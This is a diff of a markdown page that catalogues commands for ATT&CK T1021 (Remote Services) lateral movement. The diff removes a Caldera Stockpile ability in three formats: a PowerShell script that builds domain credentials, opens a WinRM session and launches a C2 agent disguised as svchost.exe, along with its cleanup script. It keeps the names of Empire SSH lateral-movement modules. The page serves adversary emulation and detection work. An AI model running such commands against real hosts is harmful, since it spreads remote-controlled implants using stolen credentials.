@@ -29,7 +29,6 @@ In an enterprise environment, servers and workstations can be organized into dom
 ## Potential Commands
 
 ```
-{'windows': {'psh': {'command': '$username = "#{domain.user.name}";\n$password = "#{domain.user.password}";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n', 'cleanup': '$username = "#{domain.user.name}";\n$password = "#{domain.user.password}";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n', 'payloads': ['sandcat.go-windows']}}}
 python/lateral_movement/multi/ssh_command
 python/lateral_movement/multi/ssh_command
 python/lateral_movement/multi/ssh_launcher
@@ -39,62 +38,7 @@ python/lateral_movement/multi/ssh_launcher
 ## Commands Dataset
 
 ```
-[{'command': {'windows': {'psh': {'cleanup': '$username = '
-                                             '"#{domain.user.name}";\n'
-                                             '$password = '
-                                             '"#{domain.user.password}";\n'
-                                             '$secstr = New-Object -TypeName '
-                                             'System.Security.SecureString;\n'
-                                             '$password.ToCharArray() | '
-                                             'ForEach-Object '
-                                             '{$secstr.AppendChar($_)};\n'
-                                             '$cred = New-Object -Typename '
-                                             'System.Management.Automation.PSCredential '
-                                             '-Argumentlist $username, '
-                                             '$secstr;\n'
-                                             '$session = New-PSSession '
-                                             '-ComputerName '
-                                             '#{remote.host.name} -Credential '
-                                             '$cred;\n'
-                                             'Invoke-Command -Session $session '
-                                             '-ScriptBlock{start-job '
-                                             '-scriptblock{Get-Process cmd | '
-                                             'Where-Object Path -eq '
-                                             'C:\\Users\\Public\\svchost.exe | '
-                                             'Stop-Process}};\n'
-                                             'Start-Sleep -s 5;\n'
-                                             'Remove-PSSession -Session '
-                                             '$session;\n',
-                                  'command': '$username = '
-                                             '"#{domain.user.name}";\n'
-                                             '$password = '
-                                             '"#{domain.user.password}";\n'
-                                             '$secstr = New-Object -TypeName '
-                                             'System.Security.SecureString;\n'
-                                             '$password.ToCharArray() | '
-                                             'ForEach-Object '
-                                             '{$secstr.AppendChar($_)};\n'
-                                             '$cred = New-Object -Typename '
-                                             'System.Management.Automation.PSCredential '
-                                             '-Argumentlist $username, '
-                                             '$secstr;\n'
-                                             '$session = New-PSSession '
-                                             '-ComputerName '
-                                             '#{remote.host.name} -Credential '
-                                             '$cred;\n'
-                                             'Invoke-Command -Session $session '
-                                             '-ScriptBlock{start-job '
-                                             '-scriptblock{cmd.exe /c start '
-                                             'C:\\Users\\Public\\svchost.exe '
-                                             '-server #{server} -executors '
-                                             'psh}};\n'
-                                             'Start-Sleep -s 5;\n'
-                                             'Remove-PSSession -Session '
-                                             '$session;\n',
-                                  'payloads': ['sandcat.go-windows']}}},
-  'name': 'Start Agent using WinRM (WinRM)',
-  'source': 'data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml'},
- {'command': 'python/lateral_movement/multi/ssh_command',
+[{'command': 'python/lateral_movement/multi/ssh_command',
   'name': 'Empire Module Command',
   'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
  {'command': 'python/lateral_movement/multi/ssh_command',
@@ -144,117 +88,7 @@ python/lateral_movement/multi/ssh_launcher
 ## Raw Dataset
 
 ```json
-[{'Mitre Stockpile - Start Agent using WinRM (WinRM)': {'description': 'Start '
-                                                                       'Agent '
-                                                                       'using '
-                                                                       'WinRM '
-                                                                       '(WinRM)',
-                                                        'id': '41bb2b7a-75af-49fd-bd15-6c827df25921',
-                                                        'name': 'Start Agent '
-                                                                '(WinRM)',
-                                                        'platforms': {'windows': {'psh': {'cleanup': '$username '
-                                                                                                     '= '
-                                                                                                     '"#{domain.user.name}";\n'
-                                                                                                     '$password '
-                                                                                                     '= '
-                                                                                                     '"#{domain.user.password}";\n'
-                                                                                                     '$secstr '
-                                                                                                     '= '
-                                                                                                     'New-Object '
-                                                                                                     '-TypeName '
-                                                                                                     'System.Security.SecureString;\n'
-                                                                                                     '$password.ToCharArray() '
-                                                                                                     '| '
-                                                                                                     'ForEach-Object '
-                                                                                                     '{$secstr.AppendChar($_)};\n'
-                                                                                                     '$cred '
-                                                                                                     '= '
-                                                                                                     'New-Object '
-                                                                                                     '-Typename '
-                                                                                                     'System.Management.Automation.PSCredential '
-                                                                                                     '-Argumentlist '
-                                                                                                     '$username, '
-                                                                                                     '$secstr;\n'
-                                                                                                     '$session '
-                                                                                                     '= '
-                                                                                                     'New-PSSession '
-                                                                                                     '-ComputerName '
-                                                                                                     '#{remote.host.name} '
-                                                                                                     '-Credential '
-                                                                                                     '$cred;\n'
-                                                                                                     'Invoke-Command '
-                                                                                                     '-Session '
-                                                                                                     '$session '
-                                                                                                     '-ScriptBlock{start-job '
-                                                                                                     '-scriptblock{Get-Process '
-                                                                                                     'cmd '
-                                                                                                     '| '
-                                                                                                     'Where-Object '
-                                                                                                     'Path '
-                                                                                                     '-eq '
-                                                                                                     'C:\\Users\\Public\\svchost.exe '
-                                                                                                     '| '
-                                                                                                     'Stop-Process}};\n'
-                                                                                                     'Start-Sleep '
-                                                                                                     '-s '
-                                                                                                     '5;\n'
-                                                                                                     'Remove-PSSession '
-                                                                                                     '-Session '
-                                                                                                     '$session;\n',
-                                                                                          'command': '$username '
-                                                                                                     '= '
-                                                                                                     '"#{domain.user.name}";\n'
-                                                                                                     '$password '
-                                                                                                     '= '
-                                                                                                     '"#{domain.user.password}";\n'
-                                                                                                     '$secstr '
-                                                                                                     '= '
-                                                                                                     'New-Object '
-                                                                                                     '-TypeName '
-                                                                                                     'System.Security.SecureString;\n'
-                                                                                                     '$password.ToCharArray() '
-                                                                                                     '| '
-                                                                                                     'ForEach-Object '
-                                                                                                     '{$secstr.AppendChar($_)};\n'
-                                                                                                     '$cred '
-                                                                                                     '= '
-                                                                                                     'New-Object '
-                                                                                                     '-Typename '
-                                                                                                     'System.Management.Automation.PSCredential '
-                                                                                                     '-Argumentlist '
-                                                                                                     '$username, '
-                                                                                                     '$secstr;\n'
-                                                                                                     '$session '
-                                                                                                     '= '
-                                                                                                     'New-PSSession '
-                                                                                                     '-ComputerName '
-                                                                                                     '#{remote.host.name} '
-                                                                                                     '-Credential '
-                                                                                                     '$cred;\n'
-                                                                                                     'Invoke-Command '
-                                                                                                     '-Session '
-                                                                                                     '$session '
-                                                                                                     '-ScriptBlock{start-job '
-                                                                                                     '-scriptblock{cmd.exe '
-                                                                                                     '/c '
-                                                                                                     'start '
-                                                                                                     'C:\\Users\\Public\\svchost.exe '
-                                                                                                     '-server '
-                                                                                                     '#{server} '
-                                                                                                     '-executors '
-                                                                                                     'psh}};\n'
-                                                                                                     'Start-Sleep '
-                                                                                                     '-s '
-                                                                                                     '5;\n'
-                                                                                                     'Remove-PSSession '
-                                                                                                     '-Session '
-                                                                                                     '$session;\n',
-                                                                                          'payloads': ['sandcat.go-windows']}}},
-                                                        'tactic': 'lateral-movement',
-                                                        'technique': {'attack_id': 'T1021',
-                                                                      'name': 'Remote '
-                                                                              'Services'}}},
- {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
+[{'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1021',
                                             'ATT&CK Technique #2': '',
                                             'Concatenate for Python Dictionary': '"python/lateral_movement/multi/ssh_command":  '
                                                                                  '["T1021"],',
